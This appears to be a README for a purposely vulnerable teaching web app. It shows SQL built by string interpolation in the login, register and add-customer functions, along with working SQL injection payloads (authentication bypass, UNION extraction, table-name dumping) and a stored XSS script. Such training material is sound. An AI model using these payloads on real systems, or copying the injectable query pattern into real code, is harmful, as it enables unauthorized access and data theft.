# Vulnerable Web Application Demo

This is a purposely vulnerable web project built for educational and testing purposes only.  
It demonstrates common web security issues including:

- SQL Injection (SQLi)
- Cross-Site Scripting (XSS)
- Unvalidated input handling

## Included Vulnerabilities

## 1) SQL Injection in Login Function

**Vulnerable Code:**
```python
query = f"SELECT * FROM users_user WHERE username = '{username}' AND password = '{password}'"
```

- Directly inserts user input (`username` and `password`) into an SQL query.
- No input validation or parameterized queries.

**Exploit Payload:**
```sql
' OR '1'='1' --
```

**Query becomes:**
```sql
SELECT * FROM users_user WHERE username = '' OR '1'='1' --' AND password = ''
```
- `'1'='1'` is always **true**, so the attacker can log in without credentials.

---

## 2) SQL Injection in Register Function

**Vulnerable Code:**
```python
user_exists_query = f"SELECT * FROM users_user WHERE username = '{username}' OR email = '{email}'"
```

- **Username and email are directly embedded** in the SQL query.
- No **input sanitization** or **parameterized queries**.

**Exploit Payload:**
```sql
' UNION SELECT sqlite_version(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--
```

**Query becomes:**
```sql
SELECT * FROM users_user WHERE username = '' UNION SELECT sqlite_version(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--' OR email = ''
```
- **Extracts the SQLite version** and assigns it as `username`.

---

## 3) SQL Injection & Stored XSS in Add Customer Function

**Vulnerable Code:**
```python
insert_query = f"""
    INSERT INTO users_customer (first_name, last_name, customer_id, phone_number, email)
    VALUES ('{first_name}', '{last_name}', '{customer_id}', '{phone_number}', '{email}')
"""
```

- **Directly embeds user input into SQL without sanitization.**
- Allows **SQL Injection** and **Stored XSS**.

### **SQL Injection Payload:**
```sql
test' || (SELECT group_concat(name) FROM sqlite_master WHERE type='table') || (SELECT hex(randomblob(4))) || '@example.com' || '--
```

**What Happens?**
- Inserted as a client name in the customer list.
- Displays all **database table names** on the View Customer page.

### **Stored XSS Payload:**
```html
<script>alert("XSS Attack!");</script>
```

**What Happens?**
- Injected into `first_name`, and every time a user views the customer list, it triggers JavaScript.
- Can lead to **account hijacking** or **session theft**.

---



